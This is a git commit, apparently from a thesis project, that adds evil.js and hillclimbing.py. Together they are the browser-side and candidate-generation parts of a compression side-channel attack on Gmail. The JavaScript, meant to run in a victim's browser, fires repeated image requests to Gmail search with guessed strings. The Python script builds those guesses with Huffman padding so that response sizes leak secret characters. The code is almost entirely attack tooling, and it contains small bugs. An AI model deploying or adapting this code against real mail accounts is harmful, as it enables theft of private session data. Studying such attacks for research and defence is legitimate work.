e9a1336d5e5d3ca0b496eaf9959c95685e4df93b
Dimitris Karakostas <james.k.urb@gmail.com>
2015-08-13 22:20:34 +0300

    Added threat model description

---
+++ thesis/src/evil.js
@@ -0,0 +1,43 @@
+function compare_arrays(array_1 = [], array_2 = []) {
+    if (array_1.length != array_2.length)
+            return false;
+    for (var i=0; i<array_1.length; i++)
+            if (array_1[i] != array_2[i])
+                    return false;
+    return true;
+}
+
+function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout = 4000) {
+    jQuery.get("request.txt").done(function(data) {
+        var input = data.split('\n');
+        if (input.length < 2) {
+            setTimeout(function() {
+                makeRequest(0, total, alphabet, ref)
+            }, 10000);
+            return;
+        }
+        var new_ref = input[0];
+        var new_alphabet = input[1].split(',');
+        if (!compare_arrays(alphabet, new_alphabet) || ref != new_ref) {
+                setTimeout(function() {
+                        makeRequest(0, total, new_alphabet, new_ref);
+                }, 10000);
+                return;
+        }
+        var search = alphabet[iterator];
+        var request = "https://mail.google.com/mail/u/0/x/?s=q&q=" + search;
+        var img = new Image();
+        img.src = request;
+        iterator = iterator >= alphabet.length - 1 ? 0 : ++iterator;
+        console.log("making request %d: %s", total++, request);
+        setTimeout(function() {
+                makeRequest(iterator, total, alphabet, ref);
+        }, timeout);
+    }).fail(function() {
+        setTimeout(makeRequest(), 10000);
+        return
+    });
+    return;
+}
+
+makeRequest();
---
+++ thesis/src/hillclimbing.py
@@ -0,0 +1,94 @@
+import sys
+from io_library import get_arguments_dict
+from constants import DIGIT, LOWERCASE, UPPERCASE, DASH, NONCE_1, NONCE_2
+
+def create_alphabet(alpha_types):
+    '''
+    Create array with the alphabet we are testing.
+    '''
+    assert alpha_types, 'Empty argument for alphabet types'
+    alphabet = []
+    for t in alpha_types:
+        if t == 'n':
+            for i in DIGIT:
+                alphabet.append(i)
+        if t == 'l':
+            for i in LOWERCASE:
+                alphabet.append(i)
+        if t == 'u':
+            for i in UPPERCASE:
+                alphabet.append(i)
+        if t == 'd':
+            for i in DASH:
+                alphabet.append(i)
+    assert alphabet, 'Invalid alphabet types'
+    return alphabet
+
+def huffman_point(alphabet, test_points):
+    '''
+    Use Huffman fixed point.
+    '''
+    huffman = ''
+    for alpha_item in enumerate(alphabet):
+        if alpha_item[1] not in test_points:
+                huffman = huffman + alpha_item[1] + '_'
+    return huffman
+
+def serial_execution(alphabet, prefix):
+    '''
+    Create request list for serial method.
+    '''
+    global reflection_alphabet
+    req_list = []
+    for i in xrange(len(alphabet)):
+        huffman = huffman_point(alphabet, [alphabet[i]])
+        req_list.append(huffman + prefix + alphabet[i])
+    reflection_alphabet = alphabet
+    return req_list
+
+def parallel_execution(alphabet, prefix):
+    '''
+    Create request list for parallel method.
+    '''
+    global reflection_alphabet
+    if len(alphabet) % 2:
+        alphabet.append('^')
+    first_half = alphabet[::2]
+    first_huffman = huffman_point(alphabet, first_half)
+    second_half = alphabet[1::2]
+    second_huffman = huffman_point(alphabet, second_half)
+    head = ''
+    tail = ''
+    for i in xrange(len(alphabet)/2):
+        head = head + prefix + first_half[i] + ' '
+        tail = tail + prefix + second_half[i] + ' '
+    reflection_alphabet = [head, tail]
+    return [first_huffman + head, second_huffman + tail]
+
+def create_request_file(args_dict):
+    '''
+    Create the 'request' file used by evil.js to issue the requests.
+    '''
+    method_functions = {'s': serial_execution,
+                        'p': parallel_execution}
+
+    prefix = args_dict['prefix']
+    assert prefix, 'Empty prefix argument'
+    method = args_dict['method']
+    assert prefix, 'Empty method argument'
+    search_alphabet = args_dict['alphabet'] if 'alphabet' in args_dict else create_alphabet(args_dict['alpha_types'])
+    with open('request.txt', 'w') as f:
+        f.write(prefix + '\n')
+        total_tests = []
+        alphabet = method_functions[method](search_alphabet, prefix)
+        for test in alphabet:
+            huffman_nonce = huffman_point(alphabet, test)
+            search_string = NONCE_1 + test + NONCE_2
+            total_tests.append(search_string)
+        f.write(','.join(total_tests))
+        f.close()
+    return reflection_alphabet
+
+if __name__ == '__main__':
+    args_dict = get_arguments_dict(sys.argv)
+    create_request_file(args_dict)
